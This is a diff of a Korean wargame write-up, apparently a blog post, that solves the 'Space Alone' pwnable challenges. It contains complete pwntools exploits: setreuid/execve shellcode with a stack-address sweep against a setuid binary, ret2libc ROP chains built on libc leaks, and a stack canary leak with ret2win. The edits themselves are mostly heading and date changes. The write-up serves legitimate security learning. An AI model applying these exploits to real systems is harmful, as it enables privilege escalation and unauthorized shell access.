@@ -1,7 +1,7 @@
 ---
 title: "Space Alone 올클리어"
 subtitle: "Pwnable · 시스템해킹 · Ch.1~10 올클리어"
-date: 2026-11-18 04:00:00 +0900
+date: 2026-10-28 21:00:00 +0900
 category: ctf
 group: wargame
 tags: ["pwn", "pwnable", "wargame"]
@@ -235,11 +235,11 @@ p.interactive()
 
 ---
 
-#### 1. 문제 파악
+### 1. 문제 파악
 
 ![image.png](/assets/img/posts/space-alone/ch2/image.png)
 
-##### 1-1. 코드 분석
+#### 1-1. 코드 분석
 
 `File_Decoder`는 **setuid(Breaking) 바이너리** (주인이 Breaking이고 setuid 비트가 걸려 있음).
 
@@ -257,7 +257,7 @@ int main(){
 - `gets()`는 입력 길이를 검사하지 않음 → `serial[256]` 이니까 256 넘기면 SBO 공격 가능.
 - 바이너리 안에 **win 함수가 따로 없다** → 리턴 주소를 "이미 있는 함수"로 보낼 수 없음 → **셸코드를 직접 넣어야 함**.
 
-##### 1-2. 보호기법 확인 (checksec)
+#### 1-2. 보호기법 확인 (checksec)
 
 ```
 Arch:     i386-32-little      ← 32비트
@@ -271,13 +271,13 @@ PIE:      No PIE              ← 코드 주소 고정
 
 ---
 
-#### 2. Exploit 아이디어
+### 2. Exploit 아이디어
 
 1. `gets`로 `serial`을 넘치게 해서 **리턴 주소**를 덮는다.
 2. 리턴 주소를 **주입한 셸코드의 스택 주소**로 덮는다.
 3. `main`이 `ret`하는 순간 → 셸코드 실행 → 셸 획득
 
-###### offset 계산
+##### offset 계산
 
 disass로 확인
 
@@ -290,7 +290,7 @@ disass로 확인
 
 ---
 
-#### 3. ShellCode
+### 3. ShellCode
 
 바이너리에 win 함수가 없으니 shellcode를 직접 주입한다
 
@@ -311,12 +311,12 @@ mov al,11 ; int 0x80                     ; execve 호출
 
 ---
 
-#### 4. uid / euid / setuid / setreuid
+### 4. uid / euid / setuid / setreuid
 
 > 이 개념들을 모호하게 알고 있어서 계속 막혔다.
 > 
 
-##### 신분증 두 개
+#### 신분증 두 개
 
 프로세스는 신분증을 2개 가진다:
 
@@ -325,7 +325,7 @@ mov al,11 ; int 0x80                     ; execve 호출
 
 평소엔 둘이 같다 (ruid = euid = 나).
 
-##### setuid 비트
+#### setuid 비트
 
 setuid 비트가 걸린 파일을 실행하면 → **euid가 그 파일 주인으로 바뀐다** (ruid는 그대로).
 
@@ -336,7 +336,7 @@ ruid = Decoding (나)
 euid = Breaking (파일 주인)   ← 권한은 이걸로 적용된다 → 이걸 이용하면? Breaking 파일에 접근이 가능해진다.
 ```
 
-##### 문제: `/bin/sh`가 권한을 떨군다 (이거 때문에 좀 고생함…)
+#### 문제: `/bin/sh`가 권한을 떨군다 (이거 때문에 좀 고생함…)
 
 그냥 `execve("/bin/sh")`만 하면 끝일 것 같지만 아니다. `/bin/sh`(dash)는 보안상 **"euid ≠ ruid면 수상하다"며 euid를 ruid로 되돌려** 버린다.
 
@@ -348,7 +348,7 @@ euid = Breaking (파일 주인)   ← 권한은 이걸로 적용된다 → 이�
 
 즉 **euid가 Breaking이어도, 셸을 켜는 순간 떨궈지면서 Breaking 권한을 못 쓴다.** 권한이 Decoding으로 떨어지면 Breaking 전용 파일(예: `.gdbinit`, `.bashrc`, Breaking 홈)은 그대로 `Permission denied`다. (실제로 Decoding 셸에서 그 파일들 `cat` 해보니 전부 Permission denied.)
 
-##### 해결법: `setreuid(euid, euid)`
+#### 해결법: `setreuid(euid, euid)`
 
 셸을 켜기 **직전에** ruid까지 euid와 같게 맞춘다:
 
@@ -360,9 +360,9 @@ setreuid(Breaking, Breaking)   ; ruid = euid = Breaking
 
 ---
 
-#### 5. 페이로드 구조 설계 중 문제/해결
+### 5. 페이로드 구조 설계 중 문제/해결
 
-##### 문제 1 — 셸코드 주소를 정확히 모름
+#### 문제 1 — 셸코드 주소를 정확히 모름
 
 리턴 주소를 "스택의 셸코드 위치"로 덮어야 하는데, gdb(복사본)와 실제 실행의 스택 주소가 환경 차이로 조금씩 다르다. 
 
@@ -371,7 +371,7 @@ setreuid(Breaking, Breaking)   ; ruid = euid = Breaking
 **스윕(sweep)으로 보강**
 "대략"은 불확실해서, 리턴 주소를 범위 안에서 **0x20씩 바꿔가며 자동으로 여러 번** 쏜다. (ASLR, PIE 없으므로 주소가 고정이라 가능했다.)
 
-##### 문제 2 — 셸코드 손상
+#### 문제 2 — 셸코드 손상
 
 주소를 맞춰 셸코드에 도달했는데도 **계속 크래시**났다. 문제 원인은 **셸코드 배치**였다.
 
@@ -399,7 +399,7 @@ push가 쓰는 곳 = S+260, S+264, S+268  (리턴 근처, 높은 주소)
 > 교훈: push는 항상 리턴 주소 근처(높은 주소)에서 아래로 쓴다. 그러니 셸코드는 반대편(버퍼 앞쪽, 낮은 주소)에 둬야 자기 자신을 안 부신다.
 > 
 
-##### 최종 페이로드 모양
+#### 최종 페이로드 모양
 
 ```
 [ NOP 96개 ][ 셸코드 37B ][ NOP 채움 ][ 리턴 주소(NOP Sled)]
@@ -408,14 +408,14 @@ push가 쓰는 곳 = S+260, S+264, S+268  (리턴 근처, 높은 주소)
 
 ---
 
-#### 6. 최종 Exploit 코드
+### 6. 최종 Exploit 코드
 
 ```python
 from pwn import *
 context.arch='i386'; context.os='linux'; context.log_level='error'
 exe='/home/Decoding_for_Escape/File_Decoder'
 
-### 셸코드: setreuid(euid,euid) 후 execve("/bin/sh")
+# 셸코드: setreuid(euid,euid) 후 execve("/bin/sh")
 sc = asm('''
  xor eax,eax; mov al,49;  int 0x80            # geteuid()
  mov ebx,eax; mov ecx,eax; xor eax,eax; mov al,70; int 0x80   # setreuid(euid,euid)
@@ -427,7 +427,7 @@ pre  = 0x60
 body = b'\x90'*pre + sc                 # 셸코드를 앞쪽에
 body += b'\x90'*(268 - len(body))       # 리턴 직전까지 NOP로 채움
 
-### 리턴 주소를 범위에서 sweep (NOP sled 위 아무 데나 올라가면 성공)
+# 리턴 주소를 범위에서 sweep (NOP sled 위 아무 데나 올라가면 성공)
 for addr in range(0xffffd500, 0xffffc700, -0x20):
     p = process(exe)
     p.sendline(body + p32(addr))
@@ -442,9 +442,9 @@ for addr in range(0xffffd500, 0xffffc700, -0x20):
 
 ---
 
-#### 7. Clear(?)
+### 7. Clear(?)
 
-##### (1) id로 권한 확인
+#### (1) id로 권한 확인
 
 셸코드가 터져 `$` 프롬프트가 뜬 뒤:
 
@@ -456,7 +456,7 @@ uid=503(Breaking_Through_for_Survival) gid=502(Decoding_for_Escape)
 원래 `uid=502(Decoding)`였는데 **`uid=503(Breaking)`**으로 바뀌었다. 즉 권한 상승 성공한 것이고 다음 챕터의 유저가 된 것이다.
 **Ch.2 클리어**.
 
-##### (2) ls로 다음 과제 확인
+#### (2) ls로 다음 과제 확인
 
 Breaking 셸에서:
 
@@ -468,7 +468,7 @@ $ ls -al /home/Breaking_Through_for_Survival/
 
 ---
 
-#### 8. 여담
+### 8. 여담
 
 ```python
 암호화 방법: 3중 AES (키 1: Arkea_45678 | 키 2: Lunar_2024 | 키 3: Theta-XZ1)
@@ -479,9 +479,9 @@ $ ls -al /home/Breaking_Through_for_Survival/
 
 ---
 
-#### 9. 부록. 셸 환경 개선
+### 9. 부록. 셸 환경 개선
 
-##### 문제점
+#### 문제점
 
 얻은 셸의 stdin/stdout이 **pwntools의 파이프**에 연결돼 있어서, 진짜 터미널 장치(TTY)가 없었다. 
 
@@ -489,7 +489,7 @@ $ ls -al /home/Breaking_Through_for_Survival/
 - 페이로드 전송이 끝나면 **stdin이 EOF → 셸이 즉시 종료**
 - SSH 안에 셸이 중첩되면서 **입력이 화면에 반복 렌더링되는 노이즈**
 
-##### 문제 원인
+#### 문제 원인
 
 **파이프에는 TTY 기능(raw 모드,화면 제어,시그널)이 없다.** 그래서 터미널이 필요한 프로그램이 동작하지 않고, 입력이 끝나면 바로 EOF가 된다.
 
@@ -499,7 +499,7 @@ $ ls -al /home/Breaking_Through_for_Survival/
 > - **화면 제어** — 커서 이동·화면 지우기·색깔 등(제어코드 처리), 창 크기(rows×cols) 조회.
 > - **시그널** — Ctrl-C(SIGINT)·Ctrl-Z(SIGTSTP) 같은 잡 컨트롤.
 
-##### 시도: 처음부터 PTY로 띄우기
+#### 시도: 처음부터 PTY로 띄우기
 
 `process(..., stdin=PTY, stdout=PTY)`를 주면, pwntools가 프로세스를 **파이프가 아니라
 가짜 터미널(PTY) 위에서** 실행한다.
@@ -511,14 +511,14 @@ $ ls -al /home/Breaking_Through_for_Survival/
 > PTY는 **내 입력을 화면에 다시 출력하니까**, 판정 기준을 ”내가 친 글자(`PWNED`)”로 하면 셸이 없어도 그 글자가 보여서 거짓 성공이 난다. → ”명령을 실행해야만 나오는 출력(`id` → `uid=`)”으로 판정해야 진짜 셸만 걸러낸다.
 > 
 
-##### 변경된 익스플로잇
+#### 변경된 익스플로잇
 
 ```python
 from pwn import *
 context.arch='i386'; context.os='linux'; context.log_level='error'
 exe='/home/Decoding_for_Escape/File_Decoder'
 
-### setreuid(euid,euid) 후 execve("/bin/sh")  — 권한 유지 보장
+# setreuid(euid,euid) 후 execve("/bin/sh")  — 권한 유지 보장
 sc = asm('''
  xor eax,eax; mov al,49;  int 0x80                              /* geteuid() */
  mov ebx,eax; mov ecx,eax; xor eax,eax; mov al,70; int 0x80     /* setreuid(euid,euid) */
@@ -542,7 +542,7 @@ for addr in range(0xffffd500, 0xffffc700, -0x20):   # 스택 주소 스윕
         p.close()
 ```
 
-##### 익스플로잇 결과
+#### 익스플로잇 결과
 
 `process(..., stdin=PTY, stdout=PTY)`로 **가짜 터미널(PTY)** 위에서 띄워봤다.
 
@@ -551,13 +551,13 @@ for addr in range(0xffffd500, 0xffffc700, -0x20):   # 스택 주소 스윕
 
 ![image.png](/assets/img/posts/space-alone/ch2/image-1.png)
 
-##### 반전
+#### 반전
 
 GitHub 페이지에서 이 워게임의 **커스텀 명령어**(`cmd`, `story`, `chap`, `status`, `next`)를 발견했다. 다음 비번은 **`status` 한 줄이면** 나오고, 이건 단순 명령이라 **중첩 셸에서도 깨끗하게** 출력된다.
 
 ![image.png](/assets/img/posts/space-alone/ch2/image-2.png)
 
-###### 결과
+##### 결과
 
 익스로 셸을 얻은 뒤 `status` 실행:
 
@@ -787,7 +787,7 @@ status 명령어 사용하면 그냥 pw가 쉽게 나온다. (ch2 부록 참고)
 
 ---
 
-#### 0. 셸 문제 해결
+### 0. 셸 문제 해결
 
 Ch2에서 주입했던 셸을 Ch4까지 끌고와서 사용하려니, 계속해서 셸이 중첩되어 사용에 불편함이 컸다.
 
@@ -799,9 +799,9 @@ Ch2에서 주입했던 셸을 Ch4까지 끌고와서 사용하려니, 계속해�
 
 ---
 
-#### 1. 대상 분석
+### 1. 대상 분석
 
-##### 1-1. 코드 분석
+#### 1-1. 코드 분석
 
 ```c
 int main(){
@@ -830,7 +830,7 @@ void gadget(){                        // ← ROP 가젯 모음이 gadget() 로 �
 - `MasterKey` - `/bin/sh` 문자열 존재
 - `&read` 유출 - libc의 실제 위치를 알려줌 (ASLR 우회용).
 
-##### 1-2. 보호기법 (checksec)
+#### 1-2. 보호기법 (checksec)
 
 ![image.png](/assets/img/posts/space-alone/ch4/image.png)
 
@@ -838,9 +838,9 @@ void gadget(){                        // ← ROP 가젯 모음이 gadget() 로 �
 
 ---
 
-#### 2. 익스플로잇 아이디어
+### 2. 익스플로잇 아이디어
 
-##### ROP gadget Chain
+#### ROP gadget Chain
 
 **NX가 켜져 있으므로 스택에 올린 셸코드를 실행 못 한다** (Ch.2 방식 불가). 그래서 코드를 넣는 대신 **이미 있는 코드 조각(가젯)을 이어붙여** 원하는 동작을 만든다(ROP Chain). 
 
@@ -863,7 +863,7 @@ void gadget(){                        // ← ROP 가젯 모음이 gadget() 로 �
 >     - **32비트**: 인자를 **스택**으로 넘긴다 → `[함수주소][리턴주소][인자]`를 쌓으면 함수가 알아서 읽는다. **인자용 가젯이 불필요하다.**
 >     - **64비트**: 인자를 **레지스터**로 넘긴다(rdi=1번째). `system("/bin/sh")`를 부르려면 rdi에 `"/bin/sh"` 주소를 넣어야 하고, 스택의 값을 rdi에 옮기는 **`pop rdi; ret` 가젯이 필요**하다.
 
-##### 전체 계획
+#### 전체 계획
 
 ```
 1) 메뉴 2 선택 →  유출된 &read 확인
@@ -884,9 +884,9 @@ void gadget(){                        // ← ROP 가젯 모음이 gadget() 로 �
 
 ---
 
-#### 3. 필요한 정보 확인
+### 3. 필요한 정보 확인
 
-##### 3-1. 오프셋 (buf → 리턴 주소) = 88
+#### 3-1. 오프셋 (buf → 리턴 주소) = 88
 
 ```python
 gdb -q ./stage4
@@ -896,7 +896,7 @@ pwndbg> pipe disass main | grep -iE 'rbp|read|lea'
 
 ![image.png](/assets/img/posts/space-alone/ch4/image-1.png)
 
-##### rbp, read, lea 확인하는 이유
+#### rbp, read, lea 확인하는 이유
 
 **`lea` → 버퍼가 rbp에서 얼마나 떨어졌나**
 
@@ -918,7 +918,7 @@ call read              -> 버퍼보다 크면 오버플로우
 
 리턴주소는 **`rbp+8`**(64비트), 저장된 rbp는 **`rbp+0`**. 그래서 **rbp가 기준**이 돼야 **버퍼 → 리턴주소** 오프셋(거리)을 측정할 수 있다.
 
-##### 셋을 합치면 오프셋이 나온다
+#### 셋을 합치면 오프셋이 나온다
 
 ```
 버퍼 = rbp-0x50 
@@ -929,7 +929,7 @@ call read              -> 버퍼보다 크면 오버플로우
 > 버퍼 주소가 `lea`가 아니라 **`mov rax, rsp`** 같은 다른 방식으로 잡히면 `lea` 필터에 안 걸린다. disass main 후, 눈대중으로 훑어본 후 깔끔하게 보기 위해 위와같이 진행한 것이다.
 > 
 
-##### 3-2. pop rdi ; ret 가젯 = 0x401215
+#### 3-2. pop rdi ; ret 가젯 = 0x401215
 
 rdi(1번째 인자 레지스터)에 값을 넣기 위해 사용할 pop rdi; ret 가젯 주소를 확인한다. ROPgadget을 이용하면 가젯 주소를 아래와 같이 쉽게 구할 수 있다.
 
@@ -952,7 +952,7 @@ ROPgadget --binary ./stage4 | grep ': pop rdi ; ret'
 > ```
 > 
 
-##### 3-3. MasterKey ("/bin/sh") 주소 = 0x404050
+#### 3-3. MasterKey ("/bin/sh") 주소 = 0x404050
 
 rdi에 넣을 `"/bin/sh"` 문자열의 주소는 nm을 사용해, 아래와 같이 쉽게 구할 수 있다. 
 
@@ -968,7 +968,7 @@ D는 data섹션(초기화된 전역변수)을 의미한다. (**MasterKey라는 �
 
 물론 위와같이 objdump -t 로도 확인이 가능하기는 하나, 심볼이 명확하면 nm으로 확인하는게 훨씬 깔끔하다.
 
-##### 3-4. libc 경로 = /lib/x86_64-linux-gnu/libc.so.6
+#### 3-4. libc 경로 = /lib/x86_64-linux-gnu/libc.so.6
 
 `read`/`system`의 오프셋을 얻어, 유출된 &read에서  libc 베이스를 역산하고 system을 계산하기 위해 확인한다.
 
@@ -1008,7 +1008,7 @@ libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7d8a000)
 > - **처음엔 `libc.address = 0`** → `libc.sym['read']`는 **오프셋 그대로** 돌려준다.
 > - **`libc.address`를 세팅하면** → pwntools가 **표 전체를 그만큼 밀어서**, 이후 모든 조회가 **오프셋+베이스 = 실제주소**로 바뀐다.
 
-##### ROP 체인이 실행되는 그림
+#### ROP 체인이 실행되는 그림
 
 ```
 [ "A"*88 ]       ← 패딩 (리턴 주소 직전까지)
@@ -1026,7 +1026,7 @@ main의 `ret` 순간부터:
 
 ---
 
-#### 4. Exploit
+### 4. Exploit
 
 ```python
 from pwn import *
@@ -1035,14 +1035,14 @@ context.arch = 'amd64'
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 p    = process('./stage4')
 
-### 1) 메뉴 2 → &read 유출
+# 1) 메뉴 2 → &read 유출
 p.sendlineafter(b'Choose the display stand : ', b'2')
 p.recvuntil(b'warehouse : ')
 leak = int(p.recvline().strip(), 16)
 libc.address = leak - libc.sym['read']          # 실제 libc 베이스 확정
 log.success('libc base = %#x', libc.address)
 
-### 2) ROP 체인
+# 2) ROP 체인
 payload  = b'A'*88
 payload += p64(0x401215) + p64(0x404050)        # pop rdi; ret  +  "/bin/sh"
 payload += p64(0x401216)                         # ret (정렬)
@@ -1074,9 +1074,9 @@ p.interactive()
 
 ---
 
-#### 1. 대상 분석
+### 1. 대상 분석
 
-##### 1-1. 코드 분석 (IPS)
+#### 1-1. 코드 분석 (IPS)
 
 프로그램은 "Bunker Control System"이고, `main`이 제일 먼저 `IPS()`로 인증을 받는다.
 이번 문제의 취약점은 전부 이 `IPS()` 안에 있다. 
@@ -1129,7 +1129,7 @@ int IPS() {
 그래서 **마지막(3번째) 시도에 오버플로우 payload를 심고**, 3번 실패 → 30초 대기 → `ret` →
 우리가 덮은 주소로 점프, 이 순서가 된다.
 
-##### 1-2. 보호기법 확인 (checksec)
+#### 1-2. 보호기법 확인 (checksec)
 
 ![image.png](/assets/img/posts/space-alone/ch5/image.png)
 
@@ -1142,7 +1142,7 @@ int IPS() {
 
 ---
 
-#### 2. 익스플로잇 아이디어 RET2WIN
+### 2. 익스플로잇 아이디어 RET2WIN
 
 (사실 처음엔 win 코드를 못봐서, ret2libc로 진행하다가 계속 막혔었다. 코드 분석을 다시 하던 중 win 코드를 발견했다.) 
 
@@ -1183,7 +1183,7 @@ nm ./ips | grep -iw t
 실제`call 401150`이 system PLT진입점 즉 system()호출이다.
 > 
 
-##### 전체 익스플로잇 계획 (3번의 입력)
+#### 전체 익스플로잇 계획 (3번의 입력)
 
 카나리를 넘어 리턴주소를 덮어야 하므로 카나리를 먼저 알아야 하고, 리턴은 "3번 실패" 후에만
 일어난다. 
@@ -1198,9 +1198,9 @@ nm ./ips | grep -iw t
 
 ---
 
-#### 3. 필요한 정보 확인
+### 3. 필요한 정보 확인
 
-##### 3-1. 오프셋 (passwd → 카나리 56 / 리턴 72)
+#### 3-1. 오프셋 (passwd → 카나리 56 / 리턴 72)
 
 `IPS`를 디스어셈블해서 버퍼·카나리·리턴주소의 rbp 기준 위치를 읽는다.
 
@@ -1224,7 +1224,7 @@ lea  rax, [rbp-0x40]              ; passwd  버퍼 = rbp-0x40
 
 **확인 결과, 카나리 도달 offset은 56, 리턴 도달 offset 72이다.** 
 
-##### 3-2. WIN 호출부 = 0x401981
+#### 3-2. WIN 호출부 = 0x401981
 
 바이너리에 이미 있는 `system("/bin/sh")` 호출부. `IPS` 디스어셈블에서 `lea [binsh]; mov rdi,rax; call system` 3줄을 찾는다(2-2 참조).
 
@@ -1240,7 +1240,7 @@ gdb -q ./ips -ex 'disass IPS' -ex quit | grep -A2 '402576'
 
 → **WIN = 0x401981.** (리턴주소를 이 값으로 덮으면 system("/bin/sh") 실행한다.)
 
-##### 3-3. 카나리 leak
+#### 3-3. 카나리 leak
 
 `username`(rbp-0x80)과 `passwd`(rbp-0x40)는 **딱 붙어 있다**(64바이트 간격). `printf`는 `username`
 부터 **널을 만날 때까지** 출력한다. 그래서 둘 다 널 없이 채우고, **카나리 최하위 바이트(원래
@@ -1277,7 +1277,7 @@ canary = u64(b'\x00' + leak_bytes[121:128])
 
 ---
 
-#### 4. 최종 Exploit
+### 4. 최종 Exploit
 
 ```python
 from pwn import *
@@ -1297,18 +1297,18 @@ def attempt(user, pw, sep=0.5):
     time.sleep(sep)      # 두 read() 를 시간차로 분리
     p.send(pw)
 
-### 1) 카나리 leak
+# 1) 카나리 leak
 attempt(b'A'*64, b'B'*56 + b'\x01')
 p.recvuntil(b'Your account: ')
 data = p.recvline()
 canary = u64(b'\x00' + data[121:128])
 log.success('canary = %#018x' % canary)
 
-### 2) 실패 1회 소모 (count -> 2)
+# 2) 실패 1회 소모 (count -> 2)
 attempt(b'A', b'A')
 p.recvuntil(b'Your account: '); p.recvline()
 
-### 3) 오버플로우 -> ret2win
+# 3) 오버플로우 -> ret2win
 payload  = b'A'*56           # passwd[0..55]
 payload += p64(canary)       # [rbp-0x8]  카나리 복원
 payload += b'A'*8            # [rbp+0x0]  saved rbp (아무 8바이트, system이 곧 덮음)
@@ -1318,7 +1318,7 @@ attempt(b'A', payload)
 p.interactive()              # 30초 카운트다운 후 셸(IPS 3번 틀렸으므로)
 ```
 
-##### Exploit 구조
+#### Exploit 구조
 
 ```
 [ 'A' x 56 ][ p64(canary) ][ p64('A' x 8) ][ p64(0x401981) ]
@@ -1331,7 +1331,7 @@ p.interactive()              # 30초 카운트다운 후 셸(IPS 3번 틀렸으�
 
 ---
 
-#### 5. 클리어
+### 5. 클리어
 
 ![image.png](/assets/img/posts/space-alone/ch5/image-3.png)
 
@@ -1354,9 +1354,9 @@ p.interactive()              # 30초 카운트다운 후 셸(IPS 3번 틀렸으�
 
 ---
 
-#### 1. 대상 분석
+### 1. 대상 분석
 
-##### 1-1. 코드 분석
+#### 1-1. 코드 분석
 
 diary라는 일기장 프로그램이다. 페이지 6개를 스택 버퍼로 두고, 포인터 배열 `diary[]`로 관리한다.
 
@@ -1400,7 +1400,7 @@ int main(){
 - **리턴**: menu 3(put down)을 고르면 루프를 빠져나와 `main`이 리턴 → `leave; ret`을 이용해
 덮은 리턴주소로 점프시킬 수 있다
 
-##### 1-2. 보호기법 확인(checksec)
+#### 1-2. 보호기법 확인(checksec)
 
 ![image.png](/assets/img/posts/space-alone/ch6/image.png)
 
@@ -1411,20 +1411,20 @@ int main(){
 
 ---
 
-#### 2. 익스플로잇 아이디어
+### 2. 익스플로잇 아이디어
 
-##### 2-1. "diary[] 포인터를 덮어 임의 읽기/쓰기" → 실패
+#### 2-1. "diary[] 포인터를 덮어 임의 읽기/쓰기" → 실패
 
 처음엔 "`diary[i]` 포인터를 오버플로우로 덮으면, menu 1(puts)=임의 읽기, menu 2(read)=임의
 쓰기"가 가능한 줄 알고 시도했다. 하지만 디스어셈블로 스택 배치를 보니 `diary[]` 배열이 모든 page 버퍼보다
 아래(낮은 주소)에 있었다. 오버플로우는 **위로(높은 주소)** 쓰므로 **diary[]에 못 닿는다.** 
 
-##### 2-2.  page5(index 4) 오버플로우 → 리턴주소
+#### 2-2.  page5(index 4) 오버플로우 → 리턴주소
 
 page 버퍼 중 가장 높은 주소에 있는 `page5`(index 4)를 0x100 오버플로우하면 **카나리·saved
 rbp·리턴주소까지 닿는다.** (다른 페이지는 거기까지 못 간다) 
 
-##### 2-3. win 없음 + 바이너리에 `pop rdi` 없음 → libc로 해결
+#### 2-3. win 없음 + 바이너리에 `pop rdi` 없음 → libc로 해결
 
 - **win 함수 없음** → ret2win 불가능
 - **`system`이 바이너리에 없음** → libc의 system 필요 → **libc leak 필요**
@@ -1440,7 +1440,7 @@ rbp·리턴주소까지 닿는다.** (다른 페이지는 거기까지 못 간�
 있다. 최종 ROP는 **바이너리 가젯이 아니라 libc 가젯**으로 구성했다.
 > 
 
-##### 2-4. libc leak / "리턴주소 = libc 주소"
+#### 2-4. libc leak / "리턴주소 = libc 주소"
 
 **`main`의 리턴주소(rbp+0x8) 자체가 libc 주소**다. main을 부른 게 `__libc_start_call_main`
 (libc 내부)이기 때문이다(항상 이런가 싶어 따로 찾아보니, 동적 링크이고, main의 리턴주소이기 때문에 이런것이지 만약 정적 링크라면 libc가 바이너리에 위치해, 애초에 불가능하다.). PIE가 없으므로 **바이너리** 주소는 고정이지만 **libc는 ASLR 영향으로 주소가 계속 바뀐다. 이를 동적 계산하기 위해 libc 베이스를 구해, libc offset과 계산해야하는데**(libc_base + libc_offset = 실제 libc 주소), 이 main의 리턴주소를 읽으면 libc_base 역산이 가능하다. 
@@ -1449,7 +1449,7 @@ rbp·리턴주소까지 닿는다.** (다른 페이지는 거기까지 못 간�
 유출하게** 만들면 libc는 유출된다.(puts는 널에서 멈추므로, 중간의 카나리·saved rbp의 널을 non-null로
 덮어야 리턴주소까지 도달)
 
-##### 2-5. 익스플로잇 구조 (menu가 while(1) 루프라 여러 번 가능)
+#### 2-5. 익스플로잇 구조 (menu가 while(1) 루프라 여러 번 가능)
 
 ```
 [A] 카나리 leak : page5에 'A'*0x98 + '\x01'       → menu1 puts → 카나리[1..7]
@@ -1467,9 +1467,9 @@ rbp·리턴주소까지 닿는다.** (다른 페이지는 거기까지 못 간�
 
 ---
 
-#### 3. 필요한 정보 확인
+### 3. 필요한 정보 확인
 
-##### 3-1. 스택 레이아웃 (disass main)
+#### 3-1. 스택 레이아웃 (disass main)
 
 diary[] 세팅부(`lea [rbp-..]; mov [rbp-0x300 + i*8]`)와 접근부(`mov rax,[rbp+rax*8-0x300]`)에서
 추출한 배치:
@@ -1494,7 +1494,7 @@ diary[] 세팅부(`lea [rbp-..]; mov [rbp-0x300 + i*8]`)와 접근부(`mov rax,[
 높은 주소
 ```
 
-##### 3-2. 오프셋 (page5 기준)
+#### 3-2. 오프셋 (page5 기준)
 
 ```
 page5 → 카나리   = 0xa0 - 0x08 = 0x98 = 152
@@ -1502,7 +1502,7 @@ page5 → saved rbp = 0xa0
 page5 → 리턴주소 = 0xa0 + 0x08 = 0xa8 = 168   (read 버퍼 256 크기 안에 들어간다.)
 ```
 
-##### 3-3. 카나리 leak (ch5와 동일)
+#### 3-3. 카나리 leak (ch5와 동일)
 
 카나리 바이트0은 항상 `0x00`이라 `puts`가 거기서 멈춘다. 그래서 **카나리 바이트0을 `0x01`로
 덮어** puts가 카나리 상위 7바이트까지 흘리게 한다.
@@ -1515,7 +1515,7 @@ page5 → 리턴주소 = 0xa0 + 0x08 = 0xa8 = 168   (read 버퍼 256 크기 안�
 다시 실행하면 새 카나리가 뽑힌다.
 > 
 
-##### 3-4. libc leak (리턴주소 오프셋 = 0x29d90)
+#### 3-4. libc leak (리턴주소 오프셋 = 0x29d90)
 
 - page5에 `'A'*0xa8` → page5 + 카나리(8) + saved rbp(8)를 **전부 non-null로** 덮음
 (리턴주소 자리(0xa8)는 **안 건드린다** → 원래 libc 값 유지 위해)
@@ -1523,7 +1523,7 @@ page5 → 리턴주소 = 0xa0 + 0x08 = 0xa8 = 168   (read 버퍼 256 크기 안�
 - `ret_addr = u64(leak[0xa8:0xa8+6].ljust(8, b'\x00'))`위에서 나온 RET 하위 6바이트 뒤에 \x00을 붙여 8바이트로 만들어 리턴 주소를 복원한다.
 - **`libc_base = ret_addr - 0x29d90`** 0x29d90는 위에서 설명했듯, gdb를 통해 offset을 구해 알 수 있었다.
 
-##### 3-5. libc 가젯 (libc leak 후)
+#### 3-5. libc 가젯 (libc leak 후)
 
 `libc.address`를 세팅하면 pwntools가 전부 실제 주소로 돌려준다:
 
@@ -1536,7 +1536,7 @@ page5 → 리턴주소 = 0xa0 + 0x08 = 0xa8 = 168   (read 버퍼 256 크기 안�
 
 ---
 
-#### 4. Exploit
+### 4. Exploit
 
 ```python
 from pwn import *
@@ -1556,19 +1556,19 @@ def read_diary(idx):
     p.sendlineafter(b': ', str(idx).encode())
     return p.recvline()
 
-### 카나리 leak
+# 카나리 leak
 write_diary(4, b'A'*0x98 + b'\x01')
 canary = u64(b'\x00' + read_diary(4)[0x98+1:0x98+8])
 log.success('canary   = %#018x' % canary)
 
-### libc leak (main 리턴주소 = __libc_start_call_main + 0x29d90)
+# libc leak (main 리턴주소 = __libc_start_call_main + 0x29d90)
 write_diary(4, b'A'*0xa8)
 ret_addr = u64(read_diary(4)[0xa8:0xa8+6].ljust(8, b'\x00'))
 libc.address = ret_addr - 0x29d90
 log.success('libc base= %#018x' % libc.address)
 assert libc.address & 0xfff == 0, "libc base가 000으로 안 끝남 → 오프셋 틀림!"
 
-### ROP: system("/bin/sh")  (libc 가젯)
+# ROP: system("/bin/sh")  (libc 가젯)
 rop     = ROP(libc)
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
 ret_g   = rop.find_gadget(['ret'])[0]
@@ -1588,7 +1588,7 @@ p.sendlineafter(b'> ', b'3')  # put down → return → ROP 발동
 p.interactive()
 ```
 
-##### payload 구조
+#### payload 구조
 
 ```
 [ 'A'×0x98 ][ canary ][ fake_rbp ][ pop_rdi ][ binsh ][ ret ][ system ]
@@ -1597,7 +1597,7 @@ p.interactive()
 = 총 0xc8(200)바이트  (read 한도 256 안)
 ```
 
-##### ROP 흐름 (main의 ret 순간부터)
+#### ROP 흐름 (main의 ret 순간부터)
 
 1. `pop rdi; ret` → 다음 값 `binsh`를 rdi에 → rdi = "/bin/sh"
 2. `ret` → 정렬만 (rsp 8 밀어 16정렬 → system의 movaps 크래시 방지)
@@ -1605,7 +1605,7 @@ p.interactive()
 
 ---
 
-#### 5. 클리어
+### 5. 클리어
 
 ![image.png](/assets/img/posts/space-alone/ch6/image-4.png)
 
@@ -1622,9 +1622,9 @@ p.interactive()
 
 ---
 
-#### 0. Global Offset Table(GOT)
+### 0. Global Offset Table(GOT)
 
-##### GOT = "함수 → 실제 주소" 표이다.
+#### GOT = "함수 → 실제 주소" 표이다.
 
 바이너리의 데이터 영역(`.got.plt`)에 **함수마다 한 칸(8바이트)**씩 있다
 
@@ -1661,7 +1661,7 @@ puts@plt:  jmp *[puts@got]      ← GOT 칸에 든 "실제 주소"로 점프
 
 간단히 말하자면, 함수를 호출하면 plt가 got 칸을 거쳐 점프한다.( got 주소를 확인해,  호출된 함수의 실제 주소로 점프하여 함수를 실행하는 것이다.)
 
-##### GOT가 왜 필요한가: “libc 함수 주소를 컴파일 때 모른다”
+#### GOT가 왜 필요한가: “libc 함수 주소를 컴파일 때 모른다”
 
 프로그램이 `puts("hi")`를 부르면, 실제 `puts` 코드는 **libc.so.6 안**에 있다. 여기서
 
@@ -1669,7 +1669,7 @@ ibc는 **별도 파일**이고, **ASLR 때문에 매번 다른 주소**에 로�
 
